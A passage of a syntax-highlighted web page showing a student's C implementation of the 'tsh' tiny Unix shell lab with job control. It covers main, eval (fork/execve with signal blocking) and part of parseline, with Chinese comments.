class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * tsh - A tiny shell program with job control</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * &lt;Put your name and login ID here&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Misc manifest constants */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXLINE 1024   <span class="comment">/* max line size */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXARGS 128    <span class="comment">/* max args on a command line */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXJOBS 16     <span class="comment">/* max jobs at any point in time */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXJID 1 &lt;&lt; 16 <span class="comment">/* max job ID */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Job states */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UNDEF 0 <span class="comment">/* undefined */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FG 1    <span class="comment">/* running in foreground */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BG 2    <span class="comment">/* running in background */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ST 3    <span class="comment">/* stopped */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Jobs states: FG (foreground), BG (background), ST (stopped)</span></span><br><span class="line"><span class="comment"> * Job state transitions and enabling actions:</span></span><br><span class="line"><span class="comment"> *     FG -&gt; ST  : ctrl-z</span></span><br><span class="line"><span class="comment"> *     ST -&gt; FG  : fg command</span></span><br><span class="line"><span class="comment"> *     ST -&gt; BG  : bg command</span></span><br><span class="line"><span class="comment"> *     BG -&gt; FG  : fg command</span></span><br><span class="line"><span class="comment"> * At most 1 job can be in the FG state.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Global variables */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> **environ;   <span class="comment">/* defined in libc */</span></span><br><span class="line"><span class="keyword">char</span> prompt[] = <span class="string">&quot;tsh&gt; &quot;</span>; <span class="comment">/* command line prompt (DO NOT CHANGE) */</span></span><br><span class="line"><span class="keyword">int</span> verbose = <span class="number">0</span>;         <span class="comment">/* if true, print additional output */</span></span><br><span class="line"><span class="keyword">int</span> nextjid = <span class="number">1</span>;         <span class="comment">/* next job ID to allocate */</span></span><br><span class="line"><span class="keyword">char</span> sbuf[MAXLINE];      <span class="comment">/* for composing sprintf messages */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">job_t</span></span></span><br><span class="line"><span class="class">&#123;</span>                          <span class="comment">/* The job struct */</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid;             <span class="comment">/* job PID */</span></span><br><span class="line">    <span class="keyword">int</span> jid;               <span class="comment">/* job ID [1, 2, ...] */</span></span><br><span class="line">    <span class="keyword">int</span> state;             <span class="comment">/* UNDEF, BG, FG, or ST */</span></span><br><span class="line">    <span class="keyword">char</span> cmdline[MAXLINE]; <span class="comment">/* command line */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> <span class="title">jobs</span>[<span class="title">MAXJOBS</span>];</span> <span class="comment">/* The job list */</span></span><br><span class="line"><span class="comment">/* End global variables */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Function prototypes */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Here are the functions that you will implement */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span> **argv)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Here are helper routines that we&#x27;ve provided for you */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">parseline</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cmdline, <span class="keyword">char</span> **argv)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigquit_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clearjob</span><span class="params">(struct <span class="keyword">job_t</span> *job)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initjobs</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxjid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addjob</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">pid_t</span> pid, <span class="keyword">int</span> state, <span class="keyword">char</span> *cmdline)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">deletejob</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">pid_t</span> pid)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">fgpid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span></span>;</span><br><span class="line"><span class="function">struct <span class="keyword">job_t</span> *<span class="title">getjobpid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">pid_t</span> pid)</span></span>;</span><br><span class="line"><span class="function">struct <span class="keyword">job_t</span> *<span class="title">getjobjid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">int</span> jid)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pid2jid</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">listjobs</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usage</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unix_error</span><span class="params">(<span class="keyword">char</span> *msg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">app_error</span><span class="params">(<span class="keyword">char</span> *msg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="keyword">void</span> <span class="title">handler_t</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">handler_t</span> *<span class="title">Signal</span><span class="params">(<span class="keyword">int</span> signum, <span class="keyword">handler_t</span> *handler)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * main - The shell&#x27;s main routine </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="keyword">char</span> cmdline[MAXLINE];</span><br><span class="line">    <span class="keyword">int</span> emit_prompt = <span class="number">1</span>; <span class="comment">/* emit prompt (default) */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Redirect stderr to stdout (so that driver will get all output</span></span><br><span class="line"><span class="comment">     * on the pipe connected to stdout) */</span></span><br><span class="line">    dup2(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Parse the command line */</span></span><br><span class="line">    <span class="keyword">while</span> ((c = getopt(argc, argv, <span class="string">&quot;hvp&quot;</span>)) != EOF)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> (c)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>: <span class="comment">/* print help message */</span></span><br><span class="line">            usage();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>: <span class="comment">/* emit additional diagnostic info */</span></span><br><span class="line">            verbose = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>:            <span class="comment">/* don&#x27;t print a prompt */</span></span><br><span class="line">            emit_prompt = <span class="number">0</span>; <span class="comment">/* handy for automatic testing */</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            usage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Install the signal handlers */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* These are the ones you will need to implement */</span></span><br><span class="line">    Signal(SIGINT, sigint_handler);   <span class="comment">/* ctrl-c */</span></span><br><span class="line">    Signal(SIGTSTP, sigtstp_handler); <span class="comment">/* ctrl-z */</span></span><br><span class="line">    Signal(SIGCHLD, sigchld_handler); <span class="comment">/* Terminated or stopped child */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This one provides a clean way to kill the shell */</span></span><br><span class="line">    Signal(SIGQUIT, sigquit_handler);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize the job list */</span></span><br><span class="line">    initjobs(jobs);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Execute the shell&#x27;s read/eval loop */</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Read command line */</span></span><br><span class="line">        <span class="keyword">if</span> (emit_prompt)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, prompt);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((fgets(cmdline, MAXLINE, <span class="built_in">stdin</span>) == <span class="literal">NULL</span>) &amp;&amp; ferror(<span class="built_in">stdin</span>))</span><br><span class="line">            app_error(<span class="string">&quot;fgets error&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (feof(<span class="built_in">stdin</span>))</span><br><span class="line">        &#123; <span class="comment">/* End of file (ctrl-d) */</span></span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Evaluate the command line */</span></span><br><span class="line">        eval(cmdline);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">/* control never reaches here */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * eval - Evaluate the command line that the user has just typed in</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * If the user has requested a built-in command (quit, jobs, bg or fg)</span></span><br><span class="line"><span class="comment"> * then execute it immediately. Otherwise, fork a child process and</span></span><br><span class="line"><span class="comment"> * run the job in the context of the child. If the job is running in</span></span><br><span class="line"><span class="comment"> * the foreground, wait for it to terminate and then return.  Note:</span></span><br><span class="line"><span class="comment"> * each child process must have a unique process group ID so that our</span></span><br><span class="line"><span class="comment"> * background children don&#x27;t receive SIGINT (SIGTSTP) from the kernel</span></span><br><span class="line"><span class="comment"> * when we type ctrl-c (ctrl-z) at the keyboard.  </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> bg;                               <span class="comment">// 是否是后台程序</span></span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE];                    <span class="comment">// cmd copy</span></span><br><span class="line">    <span class="keyword">char</span> *argv[MAXARGS];                  <span class="comment">// 解析后的命令</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid = <span class="number">-1</span>;                       <span class="comment">// 子进程id</span></span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, mask_one, pre_one; <span class="comment">// 用于同步</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">    bg = parseline(cmdline, argv);</span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">0</span>] == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化blocking mask</span></span><br><span class="line">    sigfillset(&amp;mask_all);</span><br><span class="line">    sigemptyset(&amp;mask_one);</span><br><span class="line">    sigaddset(&amp;mask_one, SIGCHLD);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 正式执行命令</span></span><br><span class="line">    <span class="keyword">if</span> (!builtin_cmd(argv))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 外部命令</span></span><br><span class="line">        <span class="keyword">if</span> (access(argv[<span class="number">0</span>], F_OK) == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s: Command not found\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 能够运行的外部命令</span></span><br><span class="line">        <span class="comment">// Parent: 在fork前，block SIGCHLD 信号，避免在addjob之前Child结束，触发sigchld_handler,从而deltejob比addjob先执行</span></span><br><span class="line">        sigprocmask(SIG_BLOCK, &amp;mask_one, &amp;pre_one);</span><br><span class="line">        <span class="keyword">if</span> ((pid = fork()) == <span class="number">0</span>)</span><br><span class="line">        &#123;                  <span class="comment">// Child</span></span><br><span class="line">            setpgid(<span class="number">0</span>, <span class="number">0</span>); <span class="comment">// 改变组id，避免信号的自动传送(write up中有更相似的描述)</span></span><br><span class="line">            <span class="comment">// 执行exec之前，解除从Parent中继承过来的block_mask</span></span><br><span class="line">            sigprocmask(SIG_SETMASK, &amp;pre_one, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="comment">// 执行</span></span><br><span class="line">            <span class="keyword">if</span> (execve(argv[<span class="number">0</span>], argv, environ) == <span class="number">-1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                unix_error(<span class="string">&quot;execve child process error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123; <span class="comment">// Parent</span></span><br><span class="line">            <span class="comment">// addjob, block所有信号，避免竞争问题</span></span><br><span class="line">            sigprocmask(SIG_SETMASK, &amp;mask_all, <span class="literal">NULL</span>);</span><br><span class="line">            addjob(jobs, pid,</span><br><span class="line">                   bg ? BG : FG,</span><br><span class="line">                   buf);</span><br><span class="line">            <span class="comment">// 还原信号</span></span><br><span class="line">            sigprocmask(SIG_SETMASK, &amp;pre_one, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Parent: 前台进程处理</span></span><br><span class="line">        <span class="keyword">if</span> (!bg)</span><br><span class="line">        &#123;</span><br><span class="line">            waitfg(pid);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> 在这里输出，耦合了addjob函数(内部对nextjid++)，如何优化？</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s &amp;\n&quot;</span>, nextjid - <span class="number">1</span>, pid, argv[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * parseline - Parse the command line and build the argv array.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Characters enclosed in single quotes are treated as a single</span></span><br><span class="line"><span class="comment"> * argument.  Return true if the user has requested a BG job, false if</span></span><br><span class="line"><span class="comment"> * the user has requested a FG job.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">parseline</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cmdline, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> <span class="built_in">array</span>[MAXLINE]; <span class="comment">/* holds local copy of command line */</span></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">array</span>;          <span class="comment">/* ptr that traverses command line */</span></span><br><span class="line">    <span class="keyword">char</span> *delim;                <span class="comment">/* points to first space delimiter */</span></span><br><span class="line">    <span class="keyword">int</span> argc;                   <span class="comment">/* number of args */</span></span><br><span class="line">    <span class="keyword">int</span> bg;                     <span class="comment">/* background job? */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">    buf[<span class="built_in">strlen</span>(buf) - <span class="number">1</span>] = <span class="string">&#x27; &#x27;</span>;   <span class="comment">/* replace trailing &#x27;\n&#x27; with space */</span></span><br><span class="line">    <span class="keyword">while</span> (*buf &amp;&amp; (*buf == <span class="string">&#x27; &#x27;</span>)) <span class="comment">/* ignore leading spaces */</span></span><br><span class="line">        buf++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Build the argv list */</span></span><br><span class="line">    argc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (*buf == <span class="string">&#x27;\&#x27;&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        buf++;</span><br><span class="line">        delim = <span class="built_in">strchr</span>(buf, <span class="string">&#x27;\&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        delim = <span class="built_in">strchr</span>(buf, <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (delim)</span><br><span class="line">    &#123;</span><br><span class="line">        argv[argc++] = buf;</span><br><span class="line">        *delim = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        buf = delim + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (*buf &amp;&amp; (*buf == <span class="string">&#x27; &#x27;</span>)) <span class="comment">/* ignore spaces */</span></span><br><span class="line">            buf++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (*buf == <span class="string">&#x27;\&#x27;&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            buf++;</span><br><span class="line">            delim = <span class="built_in">strchr</span>(buf, <span class="string">&#x27;\&#x27;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            delim = <span class="built_in">strchr</span>(buf, <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    argv[argc] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">0</span>) <span class="comment">/* ignore blank line */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span 